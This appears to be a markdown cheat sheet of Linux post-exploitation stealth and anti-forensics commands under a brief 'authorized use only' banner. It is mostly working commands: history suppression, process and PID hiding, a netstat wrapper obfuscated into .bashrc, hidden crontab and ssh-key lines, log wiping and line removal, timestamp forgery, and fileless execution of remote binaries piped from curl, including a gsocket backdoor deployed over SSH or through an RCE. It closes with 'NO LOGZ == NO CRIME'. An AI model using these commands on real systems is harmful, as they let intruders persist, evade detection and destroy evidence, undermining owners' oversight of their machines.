# 05 — Stealth & Anti-Forensics

> Authorized use only. Stealth techniques reduce your footprint on an authorized target.
> Always clean up at engagement end and record actions in the brain.

---

## §hackshell — Quiet shell (no history, clean env)

```bash
source <(curl -SsfL https://thc.org/hs)
# alt: source <(curl -SsfL https://github.com/hackerschoice/hackshell/raw/main/hackshell.sh)
# no curl: source <(surl https://raw.githubusercontent.com/hackerschoice/hackshell/main/hackshell.sh)
```

Core of what it does (do manually if needed):
```bash
unset HISTFILE
[ -n "$BASH" ] && export HISTFILE="/dev/null"
export BASH_HISTORY="/dev/null" LESSHISTFILE=- REDISCLI_HISTFILE=/dev/null MYSQL_HISTFILE=/dev/null
export LANG=en_US.UTF-8
TMPDIR="/tmp"; [ -d "/var/tmp" ] && TMPDIR="/var/tmp"; [ -d "/dev/shm" ] && TMPDIR="/dev/shm"; export TMPDIR
export PATH=".:${PATH}"
alias wget='wget --no-hsts'; alias vi="vi -i NONE"; alias vim="vim -i NONE"; alias screen="screen -ln"
```

**Bonus:** any command starting with a space is not logged to history: `$  id`

---

## §hide-process — Hide process name / daemonize

```bash
# hide as 'syslogd' (note the brackets):
(exec -a syslogd nmap -Pn -F -n --open -oG - 10.0.2.1/24)

# background, hidden as sshd, output to file:
(exec -a '/usr/sbin/sshd' nmap -Pn -F -n --open -oG - 10.0.2.1/24 &>nmap.log &)

# in a screen:
screen -dmS MyName nmap -Pn -F -n --open -oG - 10.0.2.1/24
screen -x MyName   # reattach

# copy binary to a new name:
cd /dev/shm && cp "$(command -v nmap)" syslogd && PATH=.:$PATH syslogd -Pn -F -n --open -oG - 10.0.2.1/24

# bind-mount over /sbin/init:
mount -n --bind "$(command -v nmap)" /sbin/init
(/sbin/init -Pn -f -n --open -oG - 10.0.2.1/24 &>nmap.log &)
```

---

## §zapper — Hide command-line options

```bash
curl -fL -o zapper https://github.com/hackerschoice/zapper/releases/latest/download/zapper-linux-$(uname -m) && chmod 755 zapper

./zapper -a klog nmap -Pn -F -n --open -oG - 10.0.0.1/24          # show as 'klog'
(./zapper -a 'sshd: root@pts/0' nmap -Pn -F -n --open -oG - 10.0.0.1/24 &>nmap.log &)
exec ./zapper -f -a'[kworker/1:0-rcu_gp]' tmux                    # hide tmux + children as kernel thread
```

---

## §hide-connection — Hide a network connection from netstat

**Bash function in ~/.bashrc (filters port 31337 / IP 1.2.3.4):**
```bash
echo 'netstat(){ command netstat "$@" | grep -Fv -e :31337 -e 1.2.3.4; }' >>~/.bashrc \
  && touch -r /etc/passwd ~/.bashrc
```

**Obfuscated entry:**
```bash
X='netstat(){ command netstat "$@" | grep -Fv -e :31337 -e 1.2.3.4; }'
echo "eval \$(echo $(echo "$X" | xxd -ps -c1024)|xxd -r -ps) #Initialize PRNG" >>~/.bashrc \
  && touch -r /etc/passwd ~/.bashrc
```

**Fake binary earlier in PATH (/usr/local/sbin beats /usr/bin):**
```bash
echo '#! /bin/bash
exec /usr/bin/netstat "$@" | grep -Fv -e :22 -e 1.2.3.4' >/usr/local/sbin/netstat \
  && chmod 755 /usr/local/sbin/netstat && touch -r /usr/bin/netstat /usr/local/sbin/netstat
```
Do the same for `ss`, `lsof`, `ls`.

---

## §hide-pid — Hide a process (root, /proc over-mount)

```bash
hide() {
    [[ -L /etc/mtab ]] && { cp /etc/mtab /etc/mtab.bak; mv /etc/mtab.bak /etc/mtab; }
    _pid=${1:-$$}
    [[ $_pid =~ ^[0-9]+$ ]] && { mount -n --bind /dev/shm /proc/$_pid && echo "PID $_pid hidden"; return; }
    local _argstr
    for _x in "${@:2}"; do _argstr+=" '${_x//\'/\'\"\'\"\'}'"; done
    [[ $(bash -c "ps -o stat= -p \$\$") =~ \+ ]] || exec bash -c "mount -n --bind /dev/shm /proc/\$\$; exec \"$1\" $_argstr"
    bash -c "mount -n --bind /dev/shm /proc/\$\$; exec \"$1\" $_argstr"
}
hide                                 # hide current shell
hide 31337                           # hide PID 31337
hide nohup sleep 1234 &>/dev/null &  # start+hide background process
```

**Hide a process as user (ps wrapper):**
```bash
echo 'ps(){ command ps "$@" | exec -a GREP grep -Fv -e nmap -e GREP; }' >>~/.bashrc \
  && touch -r /etc/passwd ~/.bashrc
```

---

## §hide-from-cat — Hide lines from cat (ANSI / CR)

**Hide a command in ~/.bashrc (erase-line + cursor-up):**
```bash
echo -e "id #\\033[2K\\033[1A" >>~/.bashrc
```

**Hidden crontab line:**
```bash
(crontab -l; echo -e "0 2 * * * { id; date;} 2>/dev/null >/tmp/.thc-was-here #\\033[2K\\033[1A") | crontab
```

**Hide an ssh key from cat (carriage return):**
```bash
echo "ssh-ed25519 AAAAOurPublicKeyHere....blah x@y"$'\r'"$(<authorized_keys)" >authorized_keys
```

---

## §anti-forensics — Shred, restore dates, clear logs

**Shred (and without shred):**
```bash
shred -z foobar.txt
# no shred binary:
shred() { [[ -z $1 || ! -f "$1" ]] && { echo >&2 "shred [FILE]"; return 255; }
  dd status=none bs=1k count=$(du -sk ${1:?} | cut -f1) if=/dev/urandom >"$1"; rm -f "${1:?}"; }
```

**Restore file date (copy mtime from another file):**
```bash
touch -r /etc/shadow /etc/passwd   # verify: stat /etc/passwd
# hackshell's ctime also adjusts ctime/birth-time
```

**Clear a logfile (no service restart):**
```bash
>/var/log/auth.log
```

**Remove lines matching an IP/pattern from a log:**
```bash
xlog() { local a=$(sed "/${1:?}/d" <"${2:?}") && echo "$a" >"${2:?}"; }
# xlog "1\.2\.3\.4" /var/log/auth.log
# xlog "${SSH_CLIENT%% *}" /var/log/auth.log
```

---

## §memexec — Execute without touching disk (fileless)

Load a binary into memory and exec via memfd — nothing written to disk, /dev/shm, or /tmp.

```bash
memexec(){ perl '-e$^F=255;for(319,279,385,4314,4354){($f=syscall$_,$",0)>0&&last};open($o,">&=".$f);print$o(<STDIN>);exec{"/proc/$$/fd/$f"}X,@ARGV;exit 255' -- "$@"; }
# cat /usr/bin/id | memexec -u
# curl -SsfL https://thc.org/my-backdoor-binary | memexec
```

**Deploy gsocket fileless:**
```bash
GS_ARGS="-ilqD -s SecretChangeMe31337" memexec <(curl -SsfL https://gsocket.io/bin/gs-netcat_mini-linux-$(uname -m))
```

**Pipe via SSH straight into remote memory:**
```bash
MX='-e$^F=255;for(319,279,385,4314,4354){($f=syscall$_,$",0)>0&&last};open($o,">&=".$f);print$o(<STDIN>);exec{"/proc/$$/fd/$f"}X,@ARGV;exit 255'
curl -SsfL https://gsocket.io/bin/gs-netcat_mini-linux-x86_64 | ssh root@foobar "exec perl '$MX' -- -ilqD -s SecretChangeMe31337"
```

**Single-shot RCE (e.g. via PHP exploit):**
```bash
curl -SsfL https://gsocket.io/bin/gs-netcat_mini-linux-$(uname -m)|perl '-e$^F=255;for(319,279,385,4314,4354){($f=syscall$_,$",0)>0&&last};open($o,">&=".$f);print$o(<STDIN>);exec{"/proc/$$/fd/$f"}X,@ARGV;exit 255' -- -ilqD -s SecretChangeMe31337
```

---

## §devshm — Work in volatile memory

`/dev/shm` is RAM — contents vanish on reboot. **NO LOGZ == NO CRIME.**
```bash
cd /dev/shm   # stage tools, eggs, loot here
```

**Hide files without root:**
```bash
alias ls='ls -I system-dev'        # hide dir from ls (in ~/.profile)
mkdir '...' && cd '...'            # classic dot-dir
mkdir $'\t' && cd $'\t'            # tab-named dir (hard to cd into)
```

**Make a file immutable via bind-mount redirect:**
```bash
touch /var/www/cgi/blah.cgi
mount -o bind,ro /boot/backdoor.cgi /var/www/cgi/blah.cgi
```
